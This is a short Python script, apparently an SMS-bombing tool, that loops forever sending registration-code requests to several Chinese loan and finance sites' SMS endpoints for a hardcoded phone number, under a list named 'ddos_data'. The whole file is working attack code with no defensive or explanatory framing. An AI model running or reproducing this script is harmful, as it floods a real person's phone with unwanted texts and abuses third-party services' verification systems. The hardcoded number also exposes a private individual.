import requests
import time


phone_nums = ["18637355133"]

for phone_num in phone_nums:


    ddos_data = [
        {"url":"https://api.zjkgwl.com/v6/sms/send.register", "method": "post", "data":{"mobile": phone_num}},
        {"url":"http://axapi.decisiondog.cn/api/send_code", "method": "post", "data":{"mobile": phone_num}},
        {"url":"https://lzjk.njaishixin.com/api/user/h5WapSendSms.htm", "method": "post", "data":{"phone": phone_num,"type": "register"}},
        # {"url":"https://api.0c5lg.cn/turku/app/sendSmsCode/register", "method": "post", "data":{"type": 0,"platformId": 7,"cellphone": phone_num}},
        {'url':'https://api.ledoubao.cn/api/user/h5WapSendSms.htm', 'method': 'post', 'data':{'phone': phone_num,'type': 'register'}},
        {'url':'https://mg.51huihuahua.com/userCenter/smsValidate/getValidateCode.do', 'method': 'post', 'data':{'phoneNum': phone_num,'appNum': 5,'channelType': 1,'isH5': 1,'xn_data': '{"appversion":"a","cid":"1","deviceId":"a","market":"a","osversion":"a","phone":"","requestId":"a","sdkversion":"a","token":"a"}'}},
        # {'url':'https://wcapi.fin-market.com.cn/turku/app/sendSmsCode/register', 'method': 'post', 'data':{'type': 0,'platformId': 51,'cellphone': phone_num}},
        {'url':'https://cardloan.xiaoying.com/h5/user/check_register', 'method': 'post', 'data':{'os': 'h5','_srcid': 10000416,'mobile': phone_num,'source': 10000416,}},
    ]

    while True:

        for temp_dict in ddos_data:
            if temp_dict['method'] == 'post':
                r = requests.post(temp_dict['url'], temp_dict['data'])
                print(phone_num + r.content.decode())
                time.sleep(1)
            elif temp_dict['method'] == 'get':
                r = requests.get(temp_dict['url'])
                print(phone_num + r.content.decode())
                time.sleep(1)

        time.sleep(60)


